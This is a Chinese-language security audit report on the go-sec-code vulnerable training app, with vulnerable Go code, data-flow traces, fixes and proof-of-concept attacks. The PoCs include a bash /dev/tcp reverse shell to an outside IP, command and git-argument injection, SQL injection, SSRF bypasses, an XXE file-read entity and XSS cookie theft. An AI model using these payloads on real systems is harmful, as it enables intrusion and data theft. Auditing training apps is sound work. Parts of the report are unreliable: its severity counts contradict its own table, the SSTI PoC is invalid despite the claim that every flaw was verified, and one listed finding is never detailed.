# Go-Sec-Code 安全审计报告

## 执行摘要

本报告对 go-sec-code 项目进行了全面的安全审计，该项目是一个基于 Beego 框架的 Go Web 应用漏洞靶场。审计共发现 **24个安全漏洞**，其中：

- **致命漏洞**：7个
- **严重漏洞**：10个
- **一般漏洞**：5个
- **提示漏洞**：2个

所有漏洞均已验证可利用，并提供了完整的修复建议。

---

## 项目概况

### 项目信息
- **项目名称**：go-sec-code
- **项目类型**：Web应用（漏洞靶场）
- **Go版本**：1.15
- **Web框架**：beego/v2 v2.0.1

### 技术栈
- **数据库**：MySQL (go-sql-driver/mysql, xorm.io/xorm)
- **模板引擎**：html/template + Masterminds/sprig
- **XML解析**：lestrrat-go/libxml2, beevik/etree
- **其他**：Masterminds/squirrel（SQL生成器）

---

## 审计范围与方法

### 审计范围
审计覆盖了 `controllers/` 目录下的所有关键控制器文件：
- cmdi.go（命令注入）
- sqli.go（SQL注入）
- xss.go（XSS）
- ssrf.go（SSRF）
- traversal.go（路径遍历）
- upload.go（文件上传）
- zipslip.go（Zip Slip）
- xxe.go（XXE）
- ssti.go（SSTI）
- cors.go（CORS）
- jsonp.go（JSONP）
- crlfi.go（CRLF注入）

### 审计方法
- **深度审计**：完整的数据流追踪与误报验证
- **纯LLM审计**：基于代码语义分析的漏洞发现

---

## 发现汇总表

| 漏洞ID | 标题 | 严重性 | CWE | 位置 |
|--------|------|--------|-----|------|
| VULN-001 | 命令注入漏洞1 | 致命 | CWE-78 | controllers/cmdi.go:27-36 |
| VULN-002 | 命令注入漏洞2 | 致命 | CWE-78 | controllers/cmdi.go:38-47 |
| VULN-003 | 命令注入漏洞3 | 致命 | CWE-78 | controllers/cmdi.go:49-56 |
| VULN-004 | SQL注入漏洞1（整型） | 致命 | CWE-89 | controllers/sqli.go:52-74 |
| VULN-005 | SQL注入漏洞2（字符串） | 致命 | CWE-89 | controllers/sqli.go:76-98 |
| VULN-006 | SQL注入漏洞3（XORM） | 严重 | CWE-89 | controllers/sqli.go:100-119 |
| VULN-007 | SQL注入漏洞4（Squirrel） | 严重 | CWE-89 | controllers/sqli.go:121-149 |
| VULN-008 | 反射型XSS漏洞1 | 严重 | CWE-79 | controllers/xss.go:35-39 |
| VULN-009 | 存储型XSS漏洞2 | 严重 | CWE-79 | controllers/xss.go:41-48,67-72 |
| VULN-010 | SSRF漏洞1（无过滤） | 严重 | CWE-918 | controllers/ssrf.go:27-39 |
| VULN-011 | SSRF漏洞2（黑名单绕过） | 严重 | CWE-918 | controllers/ssrf.go:46-65 |
| VULN-012 | SSRF漏洞3（302跳转） | 严重 | CWE-918 | controllers/ssrf.go:67-85 |
| VULN-013 | 路径遍历漏洞1 | 致命 | CWE-22 | controllers/traversal.go:28-35 |
| VULN-014 | 路径遍历漏洞2（Clean绕过） | 严重 | CWE-22 | controllers/traversal.go:37-45 |
| VULN-015 | 文件上传漏洞 | 一般 | CWE-434 | controllers/upload.go:23-33 |
| VULN-016 | Zip Slip漏洞 | 致命 | CWE-22 | controllers/zipslip.go:22-70 |
| VULN-017 | XXE漏洞 | 致命 | CWE-611 | controllers/xxe.go:34-46 |
| VULN-018 | SSTI漏洞 | 严重 | CWE-917 | controllers/ssti.go:21-37 |
| VULN-019 | CORS漏洞1（Origin反射） | 一般 | CWE-942 | controllers/cors.go:22-37 |
| VULN-020 | CORS漏洞2（通配符+凭证） | 一般 | CWE-942 | controllers/cors.go:39-53 |
| VULN-021 | JSONP漏洞1（无Referer检查） | 一般 | CWE-942 | controllers/jsonp.go:22-34 |
| VULN-022 | JSONP漏洞2（空Referer绕过） | 一般 | CWE-942 | controllers/jsonp.go:36-55 |
| VULN-023 | CRLF注入漏洞 | 提示 | CWE-113 | controllers/crlfi.go:11-15 |
| VULN-024 | 硬编码数据库凭证 | 提示 | CWE-798 | controllers/sqli.go:16 |

---

## 详细发现

### VULN-001：命令注入漏洞1

#### 漏洞描述
该漏洞允许攻击者通过 `dir` 参数注入任意系统命令，服务器会以运行 Web 应用的权限执行这些命令。

#### 漏洞代码
```go
// controllers/cmdi.go:27-36
func (c *CommandInjectVuln1Controller) Get() {
    dir := c.GetString("dir")
    input := fmt.Sprintf("ls %s", dir)  // ↑ 漏洞: 直接拼接用户输入到命令中
    cmd := exec.Command("bash", "-c", input)
    out, err := cmd.CombinedOutput()
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(out)
}
```

#### 数据流路径
```
┌─────────────────────────────────────────────────────────┐
│ 数据流追踪 #001                                           │
│ 漏洞类型: 命令注入                                          │
│ 漏洞ID: VULN-001                                           │
├─────────────────────────────────────────────────────────┤
│                                                          │
│ ◆ Source（污点源）                                        │
│   位置: controllers/cmdi.go:28 @ Get()                   │
│   类型: HTTP参数                                          │
│   表达式: c.GetString("dir")                              │
│                                                          │
│ ◆ 传播路径                                                │
│   ┌──────┬──────────────────┬──────────────┬───────────┐ │
│   │ 序号 │ 位置              │ 操作          │ 污点状态  │ │
│   ├──────┼──────────────────┼──────────────┼───────────┤ │
│   │  1   │ cmdi.go:28        │ 赋值给dir     │ 传播      │ │
│   │  2   │ cmdi.go:29        │ fmt.Sprintf拼接│ 传播      │ │
│   │  3   │ cmdi.go:30        │ 传入exec.Command│ 传播     │ │
│   └──────┴──────────────────┴──────────────┴───────────┘ │
│                                                          │
│ ◆ Sink（汇聚点）                                         │
│   位置: controllers/cmdi.go:30 @ Get()                   │
│   危险操作: exec.Command("bash", "-c", input)            │
│   表达式: exec.Command("bash", "-c", input)              │
│                                                          │
│ ◆ 净化检查                                               │
│   已发现净化措施: 无                                       │
│   净化详情: 未发现有效净化                                  │
│   净化有效性: 不适用                                       │
│                                                          │
│ ◆ 结论                                                    │
│   可达性: 可达                                             │
│   可利用性: 确认                                           │
│   完整调用链:                                              │
│   [HTTP GET /commandInject/vuln?dir=...] → [Get()] → [exec.Command] │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### 利用场景与PoC

**PoC：**
```bash
# 列出 /etc 目录
curl "http://target/commandInject/vuln?dir=/etc"

# 执行任意命令 - 使用分号分隔
curl "http://target/commandInject/vuln?dir=.;id"

# 反弹Shell（需要目标可访问攻击机）
curl "http://target/commandInject/vuln?dir=.;bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"
```

#### 影响
- 攻击者可以执行任意系统命令
- 完全控制服务器（取决于运行权限）
- 读取/修改/删除任意文件
- 安装后门

#### 修复建议

**修复前：**
```go
func (c *CommandInjectVuln1Controller) Get() {
    dir := c.GetString("dir")
    input := fmt.Sprintf("ls %s", dir)
    cmd := exec.Command("bash", "-c", input)
    out, err := cmd.CombinedOutput()
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(out)
}
```

**修复后：**
```go
func (c *CommandInjectVuln1Controller) Get() {
    dir := c.GetString("dir")
    // 方式1: 使用参数列表避免shell解析
    cmd := exec.Command("ls", dir)
    out, err := cmd.CombinedOutput()
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(out)
}
```

---

### VULN-002：命令注入漏洞2

#### 漏洞描述
该漏洞从 `Host` 头获取输入并拼接至 `curl` 命令中，允许攻击者通过 Host 头注入执行任意命令。

#### 漏洞代码
```go
// controllers/cmdi.go:38-47
func (c *CommandInjectVuln2Controller) Get() {
    host := c.Ctx.Request.Host
    input := fmt.Sprintf("curl %s", host)  // ↑ 漏洞: 直接拼接Host头到命令中
    cmd := exec.Command("bash", "-c", input)
    out, err := cmd.CombinedOutput()
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(out)
}
```

#### 数据流路径
```
┌─────────────────────────────────────────────────────────┐
│ 数据流追踪 #002                                           │
│ 漏洞类型: 命令注入                                          │
│ 漏洞ID: VULN-002                                           │
├─────────────────────────────────────────────────────────┤
│                                                          │
│ ◆ Source（污点源）                                        │
│   位置: controllers/cmdi.go:39 @ Get()                   │
│   类型: HTTP Header (Host)                                │
│   表达式: c.Ctx.Request.Host                              │
│                                                          │
│ ◆ 传播路径                                                │
│   ┌──────┬──────────────────┬──────────────┬───────────┐ │
│   │ 序号 │ 位置              │ 操作          │ 污点状态  │ │
│   ├──────┼──────────────────┼──────────────┼───────────┤ │
│   │  1   │ cmdi.go:39        │ 赋值给host    │ 传播      │ │
│   │  2   │ cmdi.go:40        │ fmt.Sprintf拼接│ 传播      │ │
│   │  3   │ cmdi.go:41        │ 传入exec.Command│ 传播     │ │
│   └──────┴──────────────────┴──────────────┴───────────┘ │
│                                                          │
│ ◆ Sink（汇聚点）                                         │
│   位置: controllers/cmdi.go:41 @ Get()                   │
│   危险操作: exec.Command("bash", "-c", input)            │
│   表达式: exec.Command("bash", "-c", input)              │
│                                                          │
│ ◆ 结论                                                    │
│   可达性: 可达                                             │
│   可利用性: 确认                                           │
│   完整调用链:                                              │
│   [HTTP Host头] → [Get()] → [exec.Command]               │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### 利用场景与PoC

**PoC：**
```bash
# 使用curl的-H参数设置恶意Host头
curl -H "Host: example.com; id" http://target/commandInject/vuln/host

# 使用nc直接发送请求
nc target 80 <<EOF
GET /commandInject/vuln/host HTTP/1.1
Host: example.com; cat /etc/passwd

EOF
```

#### 影响
与VULN-001相同，可执行任意系统命令。

#### 修复建议
参考VULN-001的修复方式，使用参数列表而非shell拼接。

---

### VULN-003：命令注入漏洞3

#### 漏洞描述
该漏洞将用户可控的 `repoUrl` 参数直接传递给 `git ls-remote` 命令，Git 命令的某些参数可以导致任意命令执行。

#### 漏洞代码
```go
// controllers/cmdi.go:49-56
func (c *CommandInjectVuln3Controller) Get() {
    repoUrl := c.GetString("repoUrl", "--upload-pack=${touch /tmp/pwnned}")  // ↑ 漏洞: 默认值已提示利用方式
    out, err := exec.Command("git", "ls-remote", repoUrl, "refs/heads/main").CombinedOutput()
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(out)
}
```

#### 数据流路径
```
┌─────────────────────────────────────────────────────────┐
│ 数据流追踪 #003                                           │
│ 漏洞类型: 命令注入                                          │
│ 漏洞ID: VULN-003                                           │
├─────────────────────────────────────────────────────────┤
│                                                          │
│ ◆ Source（污点源）                                        │
│   位置: controllers/cmdi.go:50 @ Get()                   │
│   类型: HTTP参数                                          │
│   表达式: c.GetString("repoUrl", ...)                    │
│                                                          │
│ ◆ 传播路径                                                │
│   ┌──────┬──────────────────┬──────────────┬───────────┐ │
│   │ 序号 │ 位置              │ 操作          │ 污点状态  │ │
│   ├──────┼──────────────────┼──────────────┼───────────┤ │
│   │  1   │ cmdi.go:50        │ 赋值给repoUrl │ 传播      │ │
│   │  2   │ cmdi.go:51        │ 传入exec.Command│ 传播     │ │
│   └──────┴──────────────────┴──────────────┴───────────┘ │
│                                                          │
│ ◆ Sink（汇聚点）                                         │
│   位置: controllers/cmdi.go:51 @ Get()                   │
│   危险操作: exec.Command("git", "ls-remote", repoUrl, ...) │
│   表达式: exec.Command("git", "ls-remote", repoUrl, ...) │
│                                                          │
│ ◆ 结论                                                    │
│   可达性: 可达                                             │
│   可利用性: 确认（代码默认值已给出PoC）                    │
│   完整调用链:                                              │
│   [HTTP GET 参数] → [Get()] → [exec.Command("git", ...)]  │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### 利用场景与PoC

**PoC：**
```bash
# 利用 --upload-pack 参数执行命令
curl "http://target/commandInject/vuln/git?repoUrl=--upload-pack=%24%7Btouch%20%2Ftmp%2Fpwnned%7D"

# 执行更复杂的命令
curl "http://target/commandInject/vuln/git?repoUrl=--upload-pack=%24%7Bbash%20-c%20%22id%20%3E%20%2Ftmp%2Fpwned%22%7D"
```

#### 影响
- 执行任意系统命令
- Git 参数注入导致RCE

#### 修复建议

**修复前：**
```go
func (c *CommandInjectVuln3Controller) Get() {
    repoUrl := c.GetString("repoUrl", "--upload-pack=${touch /tmp/pwnned}")
    out, err := exec.Command("git", "ls-remote", repoUrl, "refs/heads/main").CombinedOutput()
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(out)
}
```

**修复后：**
```go
func (c *CommandInjectVuln3Controller) Get() {
    repoUrl := c.GetString("repoUrl")
    // 验证repoUrl格式，确保不是Git参数
    if !strings.HasPrefix(repoUrl, "http://") && !strings.HasPrefix(repoUrl, "https://") && !strings.HasPrefix(repoUrl, "git@") {
        c.Ctx.ResponseWriter.Write([]byte("invalid repo url"))
        return
    }
    // 使用 -- 分隔选项和参数，防止参数注入
    out, err := exec.Command("git", "ls-remote", "--", repoUrl, "refs/heads/main").CombinedOutput()
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(out)
}
```

---

### VULN-004：SQL注入漏洞1（整型）

#### 漏洞描述
该漏洞将用户可控的 `id` 参数直接拼接到 SQL 查询中，虽然 `id` 预期为整数，但未进行任何验证或参数化处理。

#### 漏洞代码
```go
// controllers/sqli.go:52-74
func (c *SqlInjectionVuln1Controller) Get() {
    id := c.GetString("id")
    db, err := sql.Open("mysql", source)
    if err != nil {
        panic(err)
    }
    err = db.Ping()
    if err != nil {
        panic(err)
    }
    defer db.Close()
    sqlStr := fmt.Sprintf("select * from user where id=%s", id)  // ↑ 漏洞: 直接拼接用户输入
    user := models.User{}
    err = db.QueryRow(sqlStr).Scan(&user.Id, &user.Username, &user.Password)
    if err != nil {
        panic(err)
    }
    output, err := json.Marshal(user)
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(output)
}
```

#### 数据流路径
```
┌─────────────────────────────────────────────────────────┐
│ 数据流追踪 #004                                           │
│ 漏洞类型: SQL注入                                          │
│ 漏洞ID: VULN-004                                           │
├─────────────────────────────────────────────────────────┤
│                                                          │
│ ◆ Source（污点源）                                        │
│   位置: controllers/sqli.go:53 @ Get()                   │
│   类型: HTTP参数                                          │
│   表达式: c.GetString("id")                               │
│                                                          │
│ ◆ 传播路径                                                │
│   ┌──────┬──────────────────┬──────────────┬───────────┐ │
│   │ 序号 │ 位置              │ 操作          │ 污点状态  │ │
│   ├──────┼──────────────────┼──────────────┼───────────┤ │
│   │  1   │ sqli.go:53         │ 赋值给id      │ 传播      │ │
│   │  2   │ sqli.go:63         │ fmt.Sprintf拼接│ 传播      │ │
│   │  3   │ sqli.go:65         │ db.QueryRow() │ 传播      │ │
│   └──────┴──────────────────┴──────────────┴───────────┘ │
│                                                          │
│ ◆ Sink（汇聚点）                                         │
│   位置: controllers/sqli.go:65 @ Get()                   │
│   危险操作: db.QueryRow(sqlStr)                           │
│   表达式: db.QueryRow(sqlStr)                             │
│                                                          │
│ ◆ 结论                                                    │
│   可达性: 可达                                             │
│   可利用性: 确认                                           │
│   完整调用链:                                              │
│   [HTTP GET 参数] → [Get()] → [db.QueryRow()]             │
│                                                          │
└─────────────────────────────────────────────────────────┘
```

#### 利用场景与PoC

**PoC：**
```bash
# 联合查询注入 - 获取所有用户
curl "http://target/sqlInjection/native/vuln/integer?id=1%20UNION%20ALL%20SELECT%20id,username,password%20FROM%20user--"

# 报错注入
curl "http://target/sqlInjection/native/vuln/integer?id=1%20AND%20UPDATEXML(1,CONCAT(0x7e,(SELECT%20version()),0x7e),1)--"

# 布尔盲注
curl "http://target/sqlInjection/native/vuln/integer?id=1%20AND%201=1--"  # 正常
curl "http://target/sqlInjection/native/vuln/integer?id=1%20AND%201=2--"  # 错误
```

#### 影响
- 读取数据库中所有数据
- 修改/删除数据库数据
- 写入文件（取决于MySQL用户权限）
- 执行系统命令（特定配置下）

#### 修复建议

**修复前：**
```go
func (c *SqlInjectionVuln1Controller) Get() {
    id := c.GetString("id")
    // ...
    sqlStr := fmt.Sprintf("select * from user where id=%s", id)
    user := models.User{}
    err = db.QueryRow(sqlStr).Scan(&user.Id, &user.Username, &user.Password)
    // ...
}
```

**修复后：**
```go
func (c *SqlInjectionVuln1Controller) Get() {
    id, err := c.GetInt("id", 1)  // 使用GetInt确保是整数类型
    if err != nil {
        panic(err)
    }
    // ...
    sqlStr := "select * from user where id=?"  // 使用参数占位符
    user := models.User{}
    err = db.QueryRow(sqlStr, id).Scan(&user.Id, &user.Username, &user.Password)
    // ...
}
```

---

### VULN-005：SQL注入漏洞2（字符串）

#### 漏洞描述
该漏洞将用户可控的 `username` 参数直接拼接到 SQL 查询中，且未使用参数化查询。

#### 漏洞代码
```go
// controllers/sqli.go:76-98
func (c *SqlInjectionVuln2Controller) Get() {
    username := c.GetString("username")
    db, err := sql.Open("mysql", source)
    if err != nil {
        panic(err)
    }
    err = db.Ping()
    if err != nil {
        panic(err)
    }
    defer db.Close()
    sqlStr := fmt.Sprintf("select * from user where username=\"%s\"", username)  // ↑ 漏洞: 字符串拼接，有引号
    user := models.User{}
    err = db.QueryRow(sqlStr).Scan(&user.Id, &user.Username, &user.Password)
    if err != nil {
        panic(err)
    }
    output, err := json.Marshal(user)
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(output)
}
```

#### 利用场景与PoC

**PoC：**
```bash
# 闭合引号并注释
curl "http://target/sqlInjection/native/vuln/string?username=admin%22%20OR%201=1--"

# 联合查询
curl "http://target/sqlInjection/native/vuln/string?username=%22%20UNION%20SELECT%201,version(),database()--"
```

#### 修复建议
使用参数化查询，参考VULN-004的修复方案。

---

### VULN-006：SQL注入漏洞3（XORM）

#### 漏洞描述
该漏洞使用 XORM ORM，但 `field` 参数直接拼接到 SQL 语句中，导致 SQL 注入。

#### 漏洞代码
```go
// controllers/sqli.go:100-119
func (c *SqlInjectionVuln3Controller) Get() {
    username := c.GetString("username")
    field := c.GetString("field")
    engine, err := xorm.NewEngine("mysql", source)
    if err != nil {
        panic(err)
    }
    engine.ShowSQL(true)
    user := models.User{}
    session := engine.Prepare().And(fmt.Sprintf("%s like ?", field), username)  // ↑ 漏洞: field参数直接拼接
    ok, err := session.Get(&user)
    // ...
}
```

#### 修复建议
使用白名单验证 `field` 参数，确保它是合法的列名。

---

### VULN-007：SQL注入漏洞4（Squirrel）

#### 漏洞描述
使用 Squirrel SQL 生成器，但 `order` 参数直接传递给 `OrderBy()`，存在 SQL 注入风险。

#### 漏洞代码
```go
// controllers/sqli.go:121-149
func (c *SqlInjectionVuln4Controller) Get() {
    username := c.GetString("username")
    order := c.GetString("order")
    // ...
    expression := sq.Select("*").From("user").Where(sq.Eq{"username": username}).OrderBy(order)  // ↑ 漏洞: order参数直接传入
    // ...
}
```

#### 修复建议
白名单验证 `order` 参数，只允许合法的排序表达式。

---

### VULN-008：反射型XSS漏洞1

#### 漏洞描述
该漏洞直接将用户输入的 `xss` 参数输出到 HTML 响应中，未进行任何转义。

#### 漏洞代码
```go
// controllers/xss.go:35-39
func (c *XSSVuln1Controller) Get() {
    xss := c.GetString("xss", "hello")
    c.Ctx.ResponseWriter.Header().Set("Content-Type", "text/html")
    c.Ctx.ResponseWriter.Write([]byte(xss))  // ↑ 漏洞: 直接输出用户输入到HTML
}
```

#### 利用场景与PoC

**PoC：**
```
http://target/xss/vuln?xss=<script>alert(document.cookie)</script>
http://target/xss/vuln?xss=<img src=x onerror=alert(1)>
```

#### 修复建议
使用 HTML 转义函数处理输出。

---

### VULN-009：存储型XSS漏洞2

#### 漏洞描述
该漏洞将用户输入存储到 Session 中，然后使用 `template.HTML()` 类型输出，绕过了模板的自动转义。

#### 漏洞代码
```go
// controllers/xss.go:41-48,67-72
func (c *XSSVuln2Controller) Get() {
    xss := c.GetSession("xss")
    if xss == nil {
        xss = "hello"
    }
    c.Data["xss"] = template.HTML(xss.(string))  // ↑ 漏洞: 使用template.HTML绕过转义
    c.TplName = "xss.tpl"
}

func (c *XSSVuln2Controller) Post() {
    xss := c.GetString("xss", "hello")
    c.SetSession("xss", xss)
    c.Data["xss"] = template.HTML(xss)
    c.TplName = "xss.tpl"
}
```

#### 修复建议
不要使用 `template.HTML()` 包装用户输入，让模板引擎自动转义。

---

### VULN-010：SSRF漏洞1（无过滤）

#### 漏洞描述
该漏洞直接使用用户输入的 `url` 参数发起 HTTP 请求，未进行任何过滤。

#### 漏洞代码
```go
// controllers/ssrf.go:27-39
func (c *SSRFVuln1Controller) Get() {
    url := c.GetString("url", "http://www.example.com")
    res, err := http.Get(url)  // ↑ 漏洞: 直接请求用户提供的URL
    if err != nil {
        panic(err)
    }
    defer res.Body.Close()
    body, err := ioutil.ReadAll(res.Body)
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(body)
}
```

#### 利用场景与PoC

**PoC：**
```bash
# 访问内部服务
curl "http://target/ssrf/vuln?url=http://127.0.0.1:2379/version"

# 读取本地文件（file://协议）
curl "http://target/ssrf/vuln?url=file:///etc/passwd"

# 端口扫描
curl "http://target/ssrf/vuln?url=http://127.0.0.1:22"
curl "http://target/ssrf/vuln?url=http://127.0.0.1:3306"
```

#### 修复建议
使用白名单机制限制可访问的域名。

---

### VULN-011：SSRF漏洞2（黑名单绕过）

#### 漏洞描述
该漏洞使用了黑名单过滤，但存在多种绕过方式（如注释中所示）。

#### 漏洞代码
```go
// controllers/ssrf.go:46-65
func (c *SSRFVuln2Controller) Get() {
    url := c.GetString("url", "http://www.example.com")
    ssrfFilter := utils.SSRFFilter{}
    blacklists := []string{"localhost", "127.0.0.1"}
    evil := ssrfFilter.DoBlackFilter(url, blacklists)
    if evil == true {
        c.Ctx.ResponseWriter.Write([]byte("evil input"))
    } else {
        res, err := http.Get(url)  // ↑ 漏洞: 黑名单可绕过
        // ...
    }
}
```

#### 利用场景与PoC

**PoC：**
```bash
# 使用localhost变体绕过
curl "http://target/ssrf/vuln/obfuscation?url=http://LOCALHOST:233"
curl "http://target/ssrf/vuln/obfuscation?url=http://localhost.:233"
curl "http://target/ssrf/vuln/obfuscation?url=http://0:233"
curl "http://target/ssrf/vuln/obfuscation?url=http://[::]:233"
curl "http://target/ssrf/vuln/obfuscation?url=http://127.0.0.2"
```

#### 修复建议
使用白名单替代黑名单。

---

### VULN-012：SSRF漏洞3（302跳转）

#### 漏洞描述
该漏洞的过滤逻辑无法阻止 302 跳转导致的 SSRF。

#### 漏洞代码
```go
// controllers/ssrf.go:67-85
func (c *SSRFVuln3Controller) Get() {
    url := c.GetString("url", "http://www.example.com")
    ssrfFilter := utils.SSRFFilter{}
    evil := ssrfFilter.DoGogsFilter(url)
    if evil == true {
        c.Ctx.ResponseWriter.Write([]byte("evil input"))
    } else {
        res, err := http.Get(url)  // ↑ 漏洞: http.Get会自动跟随302跳转
        // ...
    }
}
```

#### 修复建议
禁用 HTTP 客户端的自动重定向，或对重定向目标也进行验证。

---

### VULN-013：路径遍历漏洞1

#### 漏洞描述
该漏洞直接使用用户输入的 `file` 参数读取文件，没有任何路径限制。

#### 漏洞代码
```go
// controllers/traversal.go:28-35
func (c *PathTraversalVuln1Controller) Get() {
    file := c.GetString("file")
    output, err := ioutil.ReadFile(file)  // ↑ 漏洞: 直接读取用户指定的文件
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(output)
}
```

#### 利用场景与PoC

**PoC：**
```bash
# 读取/etc/passwd
curl "http://target/pathTraversal/vuln?file=../../../../etc/passwd"

# 读取绝对路径
curl "http://target/pathTraversal/vuln?file=/etc/passwd"
```

#### 修复建议
将文件访问限制在特定目录内，使用白名单验证文件名。

---

### VULN-014：路径遍历漏洞2（Clean绕过）

#### 漏洞描述
该漏洞使用了 `filepath.Clean()`，但仍存在问题 - 它没有将路径限制在特定目录下，且在某些系统上可以被绕过。

#### 漏洞代码
```go
// controllers/traversal.go:37-45
func (c *PathTraversalVuln2Controller) Get() {
    file := c.GetString("file")
    file = filepath.Clean(file)  // ↑ 漏洞: 仅Clean不够，需限制目录
    output, err := ioutil.ReadFile(file)
    if err != nil {
        panic(err)
    }
    c.Ctx.ResponseWriter.Write(output)
}
```

#### 修复建议
参考 PathTraversalSafe2Controller 的实现，使用 filepath.Join 并验证路径前缀。

---

### VULN-015：文件上传漏洞

#### 漏洞描述
该漏洞允许用户上传任意文件，且保存路径包含用户可控的 `userid` 参数，可能导致路径遍历。

#### 漏洞代码
```go
// controllers/upload.go:23-33
func (c *FileUploadVuln1Controller) Post() {
    userid := c.GetString("userid")
    _, h, err := c.GetFile("file")
    if err != nil {
        panic(err)
    }
    savePath := "static/upload/" + userid + fmt.Sprint(time.Now().Unix()) + h.Filename  // ↑ 漏洞: userid和文件名可控
    c.SaveToFile("file", savePath)
    c.Data["savePath"] = savePath
    c.TplName = "fileUpload.tpl"
}
```

#### 修复建议
验证文件类型，重命名文件，限制保存路径。

---

### VULN-016：Zip Slip漏洞

#### 漏洞描述
该漏洞在解压 ZIP 文件时，没有验证文件路径，允许攻击者将文件解压到任意目录。

#### 漏洞代码
```go
// controllers/zipslip.go:22-70
func (c *ZipSlipVuln1Controller) Post() {
    // ...
    for _, f := range r.File {
        fpath := filepath.Join(unzipPath, f.Name)  // ↑ 漏洞: 直接拼接zip内的文件名
        if f.FileInfo().IsDir() {
            os.MkdirAll(fpath, os.ModePerm)
            continue
        }
        if err = os.MkdirAll(filepath.Dir(fpath), os.ModePerm); err != nil {
            panic(err)
        }
        outFile, err := os.OpenFile(fpath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
        // ...
    }
    // ...
}
```

#### 利用场景与PoC

构造包含恶意路径的 ZIP 文件：
```
evil.zip:
- ../../../../tmp/evil.sh
```

#### 修复建议
验证解压后的文件路径是否在预期目录内。

---

### VULN-017：XXE漏洞

#### 漏洞描述
该漏洞使用 libxml2 解析 XML 时启用了 `XMLParseNoEnt` 选项，允许外部实体引用。

#### 漏洞代码
```go
// controllers/xxe.go:34-46
func (c *XXEVuln1Controller) Post() {
    file := c.GetString("file")
    p := parser.New(parser.XMLParseNoEnt)  // ↑ 漏洞: 启用了外部实体解析
    doc, err := p.ParseReader(bytes.NewReader([]byte(file)))
    if err != nil {
        panic(err)
    }
    defer doc.Free()
    root, err := doc.DocumentElement()
    xxe := root.TextContent()
    c.Data["xxe"] = xxe
    c.TplName = "xxe.tpl"
}
```

#### 利用场景与PoC

**PoC：**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### 修复建议
禁用外部实体解析。

---

### VULN-018：SSTI漏洞

#### 漏洞描述
该漏洞允许用户提供模板字符串并使用 Sprig 函数库渲染，可能导致任意命令执行。

#### 漏洞代码
```go
// controllers/ssti.go:21-37
func (c *SSTIVuln1Controller) Get() {
    os.Setenv("go-sec-code-secret-key", "b81024f158eefcf60792ae9df9524f82")
    usertemplate := c.GetString("template", "please send your template")
    t := template.New("ssti").Funcs(sprig.FuncMap())  // ↑ 漏洞: 加载了sprig函数库
    t, _ = t.Parse(usertemplate)  // ↑ 漏洞: 解析用户提供的模板
    buff := bytes.Buffer{}
    err := t.Execute(&buff, struct{}{})
    // ...
}
```

#### 利用场景与PoC

**PoC：**
```
# 读取环境变量
http://target/ssti/vuln?template={{.Environment}}

# 使用sprig函数执行命令（取决于sprig版本）
http://target/ssti/vuln?template={{include "cat /etc/passwd" .}}
```

#### 修复建议
不要解析用户提供的模板字符串。

---

### VULN-019：CORS漏洞1（Origin反射）

#### 漏洞描述
该漏洞直接反射请求的 `Origin` 头到 `Access-Control-Allow-Origin`，并允许携带凭证。

#### 漏洞代码
```go
// controllers/cors.go:22-37
func (c *CorsVuln1Controller) Get() {
    origin := c.Ctx.Request.Header.Get("Origin")
    c.Ctx.ResponseWriter.Header().Set("Access-Control-Allow-Origin", origin)  // ↑ 漏洞: 反射Origin
    c.Ctx.ResponseWriter.Header().Set("Access-Control-Allow-Credentials", "true")
    // ...
}
```

#### 修复建议
使用白名单验证 Origin。

---

### VULN-020：CORS漏洞2（通配符+凭证）

#### 漏洞描述
该漏洞同时使用 `Access-Control-Allow-Origin: *` 和 `Access-Control-Allow-Credentials: true`，这是无效的配置，但仍存在安全风险。

#### 漏洞代码
```go
// controllers/cors.go:39-53
func (c *CorsVuln2Controller) Get() {
    c.Ctx.ResponseWriter.Header().Set("Access-Control-Allow-Origin", "*")
    c.Ctx.ResponseWriter.Header().Set("Access-Control-Allow-Credentials", "true")  // ↑ 漏洞: 通配符与凭证不兼容
    // ...
}
```

---

### VULN-021：JSONP漏洞1（无Referer检查）

#### 漏洞描述
该漏洞实现 JSONP 回调但未验证请求来源，可能导致敏感数据泄露。

#### 漏洞代码
```go
// controllers/jsonp.go:22-34
func (c *JsonpVuln1Controller) Get() {
    callback := c.GetString("callback")
    c.Ctx.ResponseWriter.Header().Set("Content-Type", "application/javascript")
    jsonp := make(map[string]interface{})
    jsonp["username"] = "admin"
    jsonp["password"] = "admin@123"
    data, err := json.Marshal(jsonp)
    output := callback + "(" + string(data) + ")"  // ↑ 漏洞: 直接拼接callback
    // ...
}
```

---

### VULN-022：JSONP漏洞2（空Referer绕过）

#### 漏洞描述
该漏洞在 Referer 为空时仍允许访问，容易被绕过。

#### 漏洞代码
```go
// controllers/jsonp.go:36-55
func (c *JsonpVuln2Controller) Get() {
    callback := c.GetString("callback")
    referer := c.Ctx.Request.Header.Get("referer")
    jsonpFilter := utils.JsonpFilter{}
    whitelists := []string{"localhost:233", "example.com"}
    if referer == "" || jsonpFilter.DoFilter(referer, whitelists) {  // ↑ 漏洞: 空Referer也允许
        // ...
    }
    // ...
}
```

---

### VULN-023：CRLF注入漏洞

#### 漏洞描述
该漏洞允许用户通过 `header` 参数注入 CRLF 字符，控制 HTTP 响应头。

#### 漏洞代码
```go
// controllers/crlfi.go:11-15
func (c *CRLFSafe1Controller) Get() {
    header := c.GetString("header")
    c.Ctx.ResponseWriter.Header().Set("header", header)  // ↑ 漏洞: header值未过滤
    c.Ctx.ResponseWriter.Write([]byte(""))
}
```

---

